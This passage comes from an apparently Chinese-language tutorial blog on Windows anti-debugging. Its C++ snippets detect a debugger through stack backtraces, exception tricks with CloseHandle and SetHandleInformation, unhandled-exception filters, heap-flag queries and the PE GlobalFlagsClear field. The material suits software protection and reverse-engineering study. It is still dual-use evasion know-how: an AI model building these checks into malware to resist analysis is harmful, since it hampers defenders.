hProcess = <span class=\"built_in\">GetCurrentProcess</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">SymInitialize</span>(hProcess, <span class=\"literal\">NULL</span>, TRUE);</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">USHORT</span><span class=\"params\">(*PFUNRtlCaptureStackBackTrace)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\tULONG  FramesToSkip,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\tULONG  FramesToCapture,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\tPVOID* BackTrace,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\tPULONG BackTraceHash</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\t)</span></span>;</span><br><span class=\"line\">\tHMODULE hNt = <span class=\"built_in\">LoadLibrary</span>(_T(<span class=\"string\">&quot;NtDll.dll&quot;</span>));</span><br><span class=\"line\">\tPFUNRtlCaptureStackBackTrace</span><br><span class=\"line\">\t\tpCaptureStackBackTrace = (PFUNRtlCaptureStackBackTrace)</span><br><span class=\"line\">\t\t<span class=\"built_in\">GetProcAddress</span>(hNt, (<span class=\"string\">&quot;RtlCaptureStackBackTrace&quot;</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pCaptureStackBackTrace)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tvInfo.<span class=\"built_in\">push_back</span>(<span class=\"string\">&quot;RtlCaptureStackBackTrace load failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCString strStackInfo;</span><br><span class=\"line\">\tWORD wFrames = <span class=\"built_in\">pCaptureStackBackTrace</span>(<span class=\"number\">0</span>, MAX_STACK_FRAMES, arrBackTrace, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"built_in\">sizeof</span>(SYMBOL_INFOW) + <span class=\"function\">MAX_SYM_NAME * <span class=\"title\">sizeof</span><span class=\"params\">(TCHAR)</span>]</span>;</span><br><span class=\"line\">\tDWORD64 dwAddress = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tDWORD64 dwDisplacement = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tPSYMBOL_INFOW pSymbol = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tDWORD dwDisplacement2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tIMAGEHLP_LINEW64  ilLine;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (WORD wIndex = <span class=\"number\">0</span>; wIndex &lt; wFrames; ++wIndex)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdwAddress = (DWORD64)(arrBackTrace[wIndex]);</span><br><span class=\"line\">\t\tdwDisplacement = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpSymbol = (PSYMBOL_INFOW)szBuffer;</span><br><span class=\"line\">\t\tpSymbol-&gt;SizeOfStruct = <span class=\"built_in\">sizeof</span>(SYMBOL_INFOW);</span><br><span class=\"line\">\t\tpSymbol-&gt;MaxNameLen = MAX_SYM_NAME;</span><br><span class=\"line\"> </span><br><span class=\"line\">\t\tdwDisplacement2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tilLine.SizeOfStruct = <span class=\"built_in\">sizeof</span>(IMAGEHLP_LINEW64);</span><br><span class=\"line\"> </span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (TRUE == <span class=\"built_in\">SymFromAddrW</span>(hProcess, dwAddress, &amp;dwDisplacement, pSymbol) &amp;&amp;</span><br><span class=\"line\">\t\t\tTRUE == <span class=\"built_in\">SymGetLineFromAddrW64</span>(hProcess, dwAddress, &amp;dwDisplacement2, &amp;ilLine))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tstd::string sname, sfile;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">wchar2strstring</span>(sname, pSymbol-&gt;Name);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">wchar2strstring</span>(sfile, ilLine.FileName);</span><br><span class=\"line\">\t\t\tstrStackInfo.<span class=\"built_in\">Format</span>(_T(<span class=\"string\">&quot;FUN:%s() File：%s:[%d]&quot;</span>), sname.<span class=\"built_in\">c_str</span>(), sfile.<span class=\"built_in\">c_str</span>(), ilLine.LineNumber);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tstrStackInfo.<span class=\"built_in\">Format</span>((<span class=\"string\">&quot;query error: %d&quot;</span>), <span class=\"built_in\">GetLastError</span>());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tvInfo.<span class=\"built_in\">push_back</span>(strStackInfo.<span class=\"built_in\">GetBuffer</span>());</span><br><span class=\"line\"> </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">FreeLibrary</span>(hNt);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">PrintfStackInfo</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;===========start===========\\n&quot;</span>);</span><br><span class=\"line\">\tstd::vector&lt;std::string&gt; mVStackList;</span><br><span class=\"line\">\t<span class=\"built_in\">ShowTraceStack</span>(mVStackList);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; mVStackList.<span class=\"built_in\">size</span>(); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, mVStackList[i].<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;===========end===========\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"三、异常捕获\"><a href=\"#三、异常捕获\" class=\"headerlink\" title=\"三、异常捕获\"></a>三、异常捕获</h1><h2 id=\"CloseHandle、NtGetContextThread\"><a href=\"#CloseHandle、NtGetContextThread\" class=\"headerlink\" title=\"CloseHandle、NtGetContextThread\"></a>CloseHandle、NtGetContextThread</h2><p>可以通过传入错误参数的手段让调试器抛出异常后检测调试。调试情况下,一个非法的句柄会引发0xC00000008。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219154705788.png\" alt=\"image-20221219154705788\"></p>\n<p>非调试情况下。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219154800065.png\" alt=\"image-20221219154800065\"></p>\n<p>因此可以使用异常捕获来判断是否被调试。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    __try &#123;</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>((HANDLE)<span class=\"number\">672368</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __except(EXCEPTION_EXECUTE_HANDLER)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;debugger&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>VS调试模式下运行。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219155345233.png\" alt=\"image-20221219155345233\"></p>\n<p>正常运行。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219155353983.png\" alt=\"image-20221219155353983\"></p>\n<p><code>NtGetContextThread</code>同理。</p>\n<p>其他可用函数还有</p>\n<blockquote>\n<p>NtQueryInformationProcess</p>\n<p>CloseWindow</p>\n</blockquote>\n<h2 id=\"SetHandleInformation\"><a href=\"#SetHandleInformation\" class=\"headerlink\" title=\"SetHandleInformation\"></a><strong>SetHandleInformation</strong></h2><p>通过创建一个互斥体对象，利用<strong>SetHandleInformation将互斥体对象句柄</strong>标志改为HANDLE_FLAG_PROTECT_FROM_CLOSE，然后关闭句柄，如果是在调试器状态下，它会抛出EXCEPTION_EXECUTE_HANDLER异常，只要捕获到异常那么就表示程序被调试。</p>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>HANDLE_FLAG_PROTECT_FROM_CLOSE（0x2）</td>\n<td>如果设置了此标志，则调用 <a href=\"https://learn.microsoft.com/zh-cn/windows/desktop/api/handleapi/nf-handleapi-closehandle\">CloseHandle</a> 函数不会关闭对象句柄。</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">CheckCloseHandle2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> hMutex = <span class=\"built_in\">CreateMutexA</span>(<span class=\"literal\">NULL</span>, FALSE, <span class=\"string\">&quot;ntdil.dli&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">IS_VALID_HANDLE</span>(hMutex))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">SetHandleInformation</span>(hMutex, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t__try </span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">CloseHandle</span>(hMutex);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t__except (HANDLE_FLAG_PROTECT_FROM_CLOSE)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SetUnhandledExceptionFilter、UnhandledExcepFilter\"><a href=\"#SetUnhandledExceptionFilter、UnhandledExcepFilter\" class=\"headerlink\" title=\"SetUnhandledExceptionFilter、UnhandledExcepFilter\"></a>SetUnhandledExceptionFilter、UnhandledExcepFilter</h2><p>通过设置一个SEH函数，然后抛出一个异常，使其跳转到其他地方进行检查调试。如果有调试器时，默认由调试器接管异常。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Test_Console_1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果有调试器，则不会执行这个函数</span></span><br><span class=\"line\">BOOL bIsBeinDbg = TRUE;</span><br><span class=\"line\"><span class=\"function\">LONG WINAPI <span class=\"title\">UnhandledExcepFilter</span><span class=\"params\">(PEXCEPTION_POINTERS pExcepPointers)</span></span>&#123;</span><br><span class=\"line\">    bIsBeinDbg = FALSE;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 注册异常处理函数</span></span><br><span class=\"line\">    LPTOP_LEVEL_EXCEPTION_FILTER Top = <span class=\"built_in\">SetUnhandledExceptionFilter</span>(UnhandledExcepFilter);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 主动抛出一个异常</span></span><br><span class=\"line\">    <span class=\"built_in\">RaiseException</span>(EXCEPTION_FLT_DIVIDE_BY_ZERO, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bIsBeinDbg == TRUE) &#123;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">&quot;发现调试器！&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">&quot;没有调试器！&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">main_end:</span><br><span class=\"line\">    <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219160642924.png\" alt=\"image-20221219160642924\"></p>\n<h2 id=\"RtlQueryProcessDebugInformation\"><a href=\"#RtlQueryProcessDebugInformation\" class=\"headerlink\" title=\"RtlQueryProcessDebugInformation\"></a>RtlQueryProcessDebugInformation</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">PRTL_DEBUG_INFORMATION NTAPI* <span class=\"title\">RtlCreateQueryDebugBuffer</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN ULONG  Size, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN BOOLEAN  EventPair</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">NTSTATUS NTAPI* <span class=\"title\">RtlQueryProcessDebugInformation</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN ULONG  ProcessId, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN ULONG  DebugInfoClassMask, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN OUT PRTL_DEBUG_INFORMATION   </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DebugBuffer)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>ntdll!RtlQueryProcessDebugInformation()</code>函数可用于从请求进程的进程内存中读取某些字段，包括堆标志。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bool Check()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ntdll::PDEBUG_BUFFER pDebugBuffer = ntdll::RtlCreateQueryDebugBuffer(0, FALSE);</span><br><span class=\"line\">    if (!SUCCEEDED(ntdll::RtlQueryProcessDebugInformation(GetCurrentProcessId(), ntdll::PDI_HEAPS | ntdll::PDI_HEAP_BLOCKS, pDebugBuffer)))</span><br><span class=\"line\">        return false;</span><br><span class=\"line\"></span><br><span class=\"line\">    ULONG dwFlags = ((ntdll::PRTL_PROCESS_HEAPS)pDebugBuffer-&gt;HeapInformation)-&gt;Heaps[0].Flags;</span><br><span class=\"line\">    return dwFlags &amp; ~HEAP_GROWABLE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"RtlQueryProcessHeapInformation\"><a href=\"#RtlQueryProcessHeapInformation\" class=\"headerlink\" title=\"RtlQueryProcessHeapInformation\"></a>RtlQueryProcessHeapInformation</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">NTSTATUS NTAPI <span class=\"title\">RtlQueryProcessHeapInformation</span><span class=\"params\">( </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    IN OUT PRTL_DEBUG_INFORMATION Buffer </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>ntdll!RtlQueryProcessHeapInformation()</code>函数可用于从当前进程的进程内存中读取堆标志</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ool <span class=\"title\">Check</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ntdll::PDEBUG_BUFFER pDebugBuffer = ntdll::<span class=\"built_in\">RtlCreateQueryDebugBuffer</span>(<span class=\"number\">0</span>, FALSE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">SUCCEEDED</span>(ntdll::<span class=\"built_in\">RtlQueryProcessHeapInformation</span>((ntdll::PRTL_DEBUG_INFORMATION)pDebugBuffer)))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    ULONG dwFlags = ((ntdll::PRTL_PROCESS_HEAPS)pDebugBuffer-&gt;HeapInformation)-&gt;Heaps[<span class=\"number\">0</span>].Flags;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dwFlags &amp; ~HEAP_GROWABLE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"四、注册表\"><a href=\"#四、注册表\" class=\"headerlink\" title=\"四、注册表\"></a>四、注册表</h1><h2 id=\"GlobalFlagsClear\"><a href=\"#GlobalFlagsClear\" class=\"headerlink\" title=\"GlobalFlagsClear\"></a>GlobalFlagsClear</h2><p>可执行文件可以包含<code>IMAGE_LOAD_CONFIG_DIRECTORY</code>结构，该结构包含系统加载程序的其他配置参数。默认情况下，此结构不会内置于可执行文件中，但可以使用修补程序添加它。此结构具有<code>GlobalFlagsClear</code> ，该字段指示应重置 PEB 结构的 <code>NtGlobalFlag</code> 标志字段的哪些标志。该字段具有非零值，表示存在隐藏的调试器。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_IMAGE_LOAD_CONFIG_DIRECTORY</span> &#123;</span><br><span class=\"line\">    DWORD      Size;</span><br><span class=\"line\">    DWORD      TimeDateStamp;</span><br><span class=\"line\">    WORD       MajorVersion;</span><br><span class=\"line\">    WORD       MinorVersion;</span><br><span class=\"line\">    DWORD      GlobalFlagsClear;</span><br><span class=\"line\">    DWORD      GlobalFlagsSet;</span><br><span class=\"line\">    DWORD      CriticalSectionDefaultTimeout;</span><br><span class=\"line\">    ULONGLONG  DeCommitFreeBlockThreshold;</span><br><span class=\"line\">    ULONGLONG  DeCommitTotalFreeThreshold;</span><br><span class=\"line\">    ULONGLONG  LockPrefixTable;                <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  MaximumAllocationSize;</span><br><span class=\"line\">    ULONGLONG  VirtualMemoryThreshold;</span><br><span class=\"line\">    ULONGLONG  ProcessAffinityMask;</span><br><span class=\"line\">    DWORD      ProcessHeapFlags;</span><br><span class=\"line\">    WORD       CSDVersion;</span><br><span class=\"line\">    WORD       DependentLoadFlags;</span><br><span class=\"line\">    ULONGLONG  EditList;                       <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  SecurityCookie;                 <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  SEHandlerTable;                 <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  SEHandlerCount;</span><br><span class=\"line\">    ULONGLONG  GuardCFCheckFunctionPointer;    <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardCFDispatchFunctionPointer; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardCFFunctionTable;           <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardCFFunctionCount;</span><br><span class=\"line\">    DWORD      GuardFlags;</span><br><span class=\"line\">    IMAGE_LOAD_CONFIG_CODE_INTEGRITY CodeIntegrity;</span><br><span class=\"line\">    ULONGLONG  GuardAddressTakenIatEntryTable; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardAddressTakenIatEntryCount;</span><br><span class=\"line\">    ULONGLONG  GuardLongJumpTargetTable;       <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardLongJumpTargetCount;</span><br><span class=\"line\">    ULONGLONG  DynamicValueRelocTable;         <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  CHPEMetadataPointer;            <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardRFFailureRoutine;          <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardRFFailureRoutineFunctionPointer; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    DWORD      DynamicValueRelocTableOffset;</span><br><span class=\"line\">    WORD       DynamicValueRelocTableSection;</span><br><span class=\"line\">    WORD       Reserved2;</span><br><span class=\"line\">    ULONGLONG  GuardRFVerifyStackPointerFunctionPointer; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    DWORD      HotPatchTableOffset;</span><br><span class=\"line\">    DWORD      Reserved3;</span><br><span class=\"line\">    ULONGLONG  EnclaveConfigurationPointer;    <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  VolatileMetadataPointer;        <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardEHContinuationTable;       <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardEHContinuationCount;</span><br><span class=\"line\">    ULONGLONG  GuardXFGCheckFunctionPointer;   <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardXFGDispatchFunctionPointer; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardXFGTableDispatchFunctionPointer; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  CastGuardOsDeterminedFailureMode; <span class=\"comment\">// VA</span></span><br><span class=\"line\">    ULONGLONG  GuardMemcpyFunctionPointer;     <span class=\"comment\">// VA</span></span><br><span class=\"line\">&#125; IMAGE_LOAD_CONFIG_DIRECTORY, *PIMAGE_LOAD_CONFIG_DIRECTORY;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">PIMAGE_NT_HEADERS <span class=\"title\">GetImageNtHeaders</span><span class=\"params\">(PBYTE pImageBase)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBase;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (PIMAGE_NT_HEADERS)(pImageBase + pImageDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">PIMAGE_SECTION_HEADER <span class=\"title\">FindRDataSection</span><span class=\"params\">(PBYTE pImageBase)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"type\">const</span> std::string rdata = <span class=\"string\">&quot;.rdata&quot;</span>;</span><br><span class=\"line\">    PIMAGE_NT_HEADERS pImageNtHeaders = <span class=\"built_in\">GetImageNtHeaders</span>(pImageBase);</span><br><span class=\"line\">    PIMAGE_SECTION_HEADER pImageSectionHeader = <span class=\"built_in\">IMAGE_FIRST_SECTION</span>(pImageNtHeaders);</span><br><span class=\"line\">    <span class=\"type\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; n &lt; pImageNtHeaders-&gt;FileHeader.NumberOfSections; ++n)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rdata == (<span class=\"type\">char</span>*)pImageSectionHeader[n].Name)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;pImageSectionHeader[n];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">CheckGlobalFlagsClearInProcess</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    PBYTE pImageBase = (PBYTE)<span class=\"built_in\">GetModuleHandle</span>(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    PIMAGE_NT_HEADERS pImageNtHeaders = <span class=\"built_in\">GetImageNtHeaders</span>(pImageBase);</span><br><span class=\"line\">    PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pImageBase</span><br><span class=\"line\">        + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pImageLoadConfigDirectory-&gt;GlobalFlagsClear != <span class=\"number\">0</span>) #  内存中检查IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;Stop debugging program!&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">CheckGlobalFlagsClearInFile</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hExecutable = INVALID_HANDLE_VALUE;</span><br><span class=\"line\">    HANDLE hExecutableMapping = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    PBYTE pMappedImageBase = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    __try</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        PBYTE pImageBase = (PBYTE)<span class=\"built_in\">GetModuleHandle</span>(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        PIMAGE_SECTION_HEADER pImageSectionHeader = <span class=\"built_in\">FindRDataSection</span>(pImageBase);</span><br><span class=\"line\">        TCHAR pszExecutablePath[MAX_PATH];</span><br><span class=\"line\">        DWORD dwPathLength = <span class=\"built_in\">GetModuleFileName</span>(<span class=\"literal\">NULL</span>, pszExecutablePath, MAX_PATH);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0</span> == dwPathLength) __leave;</span><br><span class=\"line\">        hExecutable = <span class=\"built_in\">CreateFile</span>(pszExecutablePath, GENERIC_READ, FILE_SHARE_READ, <span class=\"literal\">NULL</span>, OPEN_EXISTING, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (INVALID_HANDLE_VALUE == hExecutable) __leave;</span><br><span class=\"line\">        hExecutableMapping = <span class=\"built_in\">CreateFileMapping</span>(hExecutable, <span class=\"literal\">NULL</span>, PAGE_READONLY, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> == hExecutableMapping) __leave;</span><br><span class=\"line\">        pMappedImageBase = (PBYTE)<span class=\"built_in\">MapViewOfFile</span>(hExecutableMapping, FILE_MAP_READ, <span 